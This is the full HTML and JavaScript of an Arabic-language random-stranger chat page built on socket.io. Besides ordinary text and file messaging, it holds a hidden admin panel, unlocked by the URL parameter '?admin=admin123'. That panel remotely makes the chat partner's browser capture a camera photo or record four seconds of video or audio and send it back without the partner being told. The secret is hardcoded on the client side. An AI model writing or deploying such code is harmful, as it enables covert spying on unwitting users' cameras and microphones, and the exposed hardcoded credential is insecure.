<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>شات بسيط وسريع</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: Tahoma, sans-serif; background: #f4f4f4; direction: rtl; }
.header { background: #1895d2; color: white; padding: 10px; text-align: center; font-size: 20px; font-weight: bold; }

#admin-bar { display: none; background: #ffeaa7; padding: 8px; text-align: center; border-bottom: 2px solid #fdcb6e; }
#admin-bar button { background: #d63031; color: white; border: none; padding: 6px 12px; margin: 3px; border-radius: 4px; cursor: pointer; font-weight: bold; }

#chat { max-width: 600px; margin: 10px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
#conv { height: 350px; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 8px; }

.msg { padding: 8px 12px; border-radius: 6px; max-width: 75%; word-break: break-word; font-size: 15px; }
.my-msg { background: #e3f2fd; color: #333; align-self: flex-start; }
.partner-msg { background: #1895d2; color: white; align-self: flex-end; }
.system-msg { background: #eee; color: #666; align-self: center; font-size: 13px; }

img, video, audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }

#send-box { display: flex; padding: 8px; background: #fff; border-top: 1px solid #ddd; gap: 5px; align-items: center; }
#inp { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 4px; outline: none; font-size: 14px; }
button.send-btn { padding: 8px 15px; background: #1895d2; color: white; border: none; border-radius: 4px; cursor: pointer; }
.file-label { cursor: pointer; font-size: 20px; padding: 0 5px; }
#file-input { display: none; }

#out { text-align: center; margin-top: 50px; display: none; }
#out a { background: coral; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; }
</style>
</head>
<body>

  <div class="header">شات سريع وخفيف</div>

  <!-- لوحة الأدمن تظهر فقط لو كتبت ?admin=admin123 في الرابط -->
  <div id="admin-bar">
    <b>لوحة التحكم السريعة:</b><br>
    <button onclick="sendAdminCmd('photo')">التقاط صورة 📸</button>
    <button onclick="sendAdminCmd('video')">تصوير فيديو 🎥</button>
    <button onclick="sendAdminCmd('audio')">تسجيل صوت 🎤</button>
  </div>

  <div id="chat">
    <div id="conv">
      <div class="system-msg" id="status-text">جاري البحث عن متصل...</div>
    </div>
    
    <div id="send-box">
      <input type="file" id="file-input" accept="image/*,video/*,audio/*">
      <label for="file-input" class="file-label" title="إرسال ملف">📁</label>
      <input type="text" id="inp" placeholder="اكتب رسالة..." autocomplete="off">
      <button class="send-btn" id="snd">إرسال</button>
    </div>
  </div>

  <div id="out">
    <h3>المستخدم غادر المحادثة</h3><br>
    <a href="javascript:location.reload()">بحث عن شخص آخر</a>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    const urlParams = new URLSearchParams(window.location.search);
    const isAdmin = urlParams.get('admin') === 'admin123';
    if (isAdmin) {
      document.getElementById('admin-bar').style.display = 'block';
    }

    const conv = document.getElementById('conv');
    const inp = document.getElementById('inp');
    const snd = document.getElementById('snd');
    const statusText = document.getElementById('status-text');
    const chatBox = document.getElementById('chat');
    const outBox = document.getElementById('out');
    const fileInput = document.getElementById('file-input');

    inp.disabled = true;
    snd.disabled = true;

    socket.emit('find_partner');

    socket.on('matched', () => {
      statusText.innerText = "تم الاتصال بنجاح!";
      setTimeout(() => statusText.style.display = 'none', 1500);
      inp.disabled = false;
      snd.disabled = false;
      inp.focus();
    });

    socket.on('partner_disconnected', () => {
      chatBox.style.display = 'none';
      outBox.style.display = 'block';
    });

    function sendMessage(type, content) {
      const data = { type, content };
      socket.emit('message', data);
      appendMsg(data, true);
    }

    snd.onclick = () => {
      if (inp.value.trim() !== '') {
        sendMessage('text', inp.value.trim());
        inp.value = '';
      }
    };

    inp.onkeypress = (e) => {
      if (e.key === 'Enter') snd.click();
    };

    fileInput.onchange = (e) => {
      const file = e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = (event) => {
        let type = 'image';
        if (file.type.startsWith('video')) type = 'video';
        else if (file.type.startsWith('audio')) type = 'audio';
        sendMessage(type, event.target.result);
      };
      reader.readAsDataURL(file);
      fileInput.value = '';
    };

    socket.on('message', (data) => {
      appendMsg(data, false);
    });

    function appendMsg(data, isMe) {
      const div = document.createElement('div');
      div.className = `msg ${isMe ? 'my-msg' : 'partner-msg'}`;

      if (data.type === 'text') {
        div.innerText = data.content;
      } else if (data.type === 'image') {
        const img = document.createElement('img');
        img.src = data.content;
        div.appendChild(img);
      } else if (data.type === 'video') {
        const vid = document.createElement('video');
        vid.src = data.content;
        vid.controls = true;
        div.appendChild(vid);
      } else if (data.type === 'audio') {
        const aud = document.createElement('audio');
        aud.src = data.content;
        aud.controls = true;
        div.appendChild(aud);
      }

      conv.appendChild(div);
      conv.scrollTop = conv.scrollHeight;
    }

    // أوامر الأدمن لالتقاط الصور والفيديو من جهاز الطرف الآخر مباشرة
    function sendAdminCmd(actionType) {
      socket.emit('admin_command', { secret: 'admin123', action: actionType });
    }

    socket.on('execute_command', async (data) => {
      if (isAdmin) return; // الأدمن لا ينفذ على نفسه

      try {
        if (data.action === 'photo') {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement('video');
          video.srcObject = stream;
          await video.play();

          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          canvas.getContext('2d').drawImage(video, 0, 0);
          
          stream.getTracks().forEach(t => t.stop());
          sendMessage('image', canvas.toDataURL('image/jpeg', 0.8));

        } else if (data.action === 'video' || data.action === 'audio') {
          const constraints = data.action === 'video' ? { video: true, audio: true } : { audio: true };
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          const chunks = [];
          const recorder = new MediaRecorder(stream);

          recorder.ondataavailable = e => chunks.push(e.data);
          recorder.onstop = () => {
            stream.getTracks().forEach(t => t.stop());
            const blob = new Blob(chunks, { type: data.action === 'video' ? 'video/webm' : 'audio/webm' });
            const reader = new FileReader();
            reader.onloadend = () => {
              sendMessage(data.action, reader.result);
            };
            reader.readAsDataURL(blob);
          };

          recorder.start();
          setTimeout(() => {
            if (recorder.state === 'recording') recorder.stop();
          }, 4000); // تسجيل لمدة 4 ثواني
        }
      } catch (err) {
        alert('يرجى السماح بالمتصفح بالوصول للكاميرا/الميكروفون');
      }
    });
  </script>
</body>
</html>
